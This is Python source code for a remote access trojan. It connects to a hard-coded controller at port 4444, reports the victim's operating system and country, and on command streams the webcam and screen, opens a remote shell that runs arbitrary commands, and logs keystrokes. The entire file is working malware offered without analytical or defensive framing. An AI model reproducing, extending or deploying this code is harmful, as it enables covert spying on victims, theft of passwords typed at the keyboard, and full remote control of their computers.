import socket
import os
import platform
import requests
import cv2
import threading
import pyautogui
from keyboard import read_event, is_pressed

# Server details
SERVER_IP = "10.0.1.33"
SERVER_PORT = 4444

def get_location():
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        return data.get('country', 'Unknown')
    except:
        return "Unknown"

def send_system_info(sock):
    os_info = f"{platform.system()} {platform.release()} {platform.version()} {platform.architecture()[0]}"
    country = get_location()
    sock.sendall(f"{os_info}|{country}".encode())

def webcam_stream(sock):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            sock.sendall(buffer.tobytes())
        if is_pressed('q'):  # Stop on 'q'
            break
    cap.release()

def screenshare(sock):
    while True:
        screenshot = pyautogui.screenshot()
        screenshot_bytes = cv2.imencode('.jpg', cv2.cvtColor(screenshot, cv2.COLOR_BGR2RGB))[1].tobytes()
        sock.sendall(screenshot_bytes)
        if is_pressed('q'):  # Stop on 'q'
            break

def shell(sock):
    while True:
        command = sock.recv(1024).decode()
        if command.lower() == "kill":
            sock.close()
            break
        try:
            output = os.popen(command).read()
            sock.sendall(output.encode() if output else b"Command executed.")
        except Exception as e:
            sock.sendall(f"Error: {str(e)}".encode())

def keylogger(sock):
    print("Keylogger started...")
    while True:
        event = read_event()
        if event.event_type == "down":
            key = event.name
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            sock.sendall(key.encode())
        if is_pressed('q'):  # Stop on 'q'
            break

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    send_system_info(sock)

    while True:
        cmd = sock.recv(1024).decode()
        if cmd == "webcam":
            threading.Thread(target=webcam_stream, args=(sock,)).start()
        elif cmd == "screenshare":
            threading.Thread(target=screenshare, args=(sock,)).start()
        elif cmd == "shell":
            threading.Thread(target=shell, args=(sock,)).start()
        elif cmd == "keylogger":
            threading.Thread(target=keylogger, args=(sock,)).start()

if __name__ == "__main__":
    main()
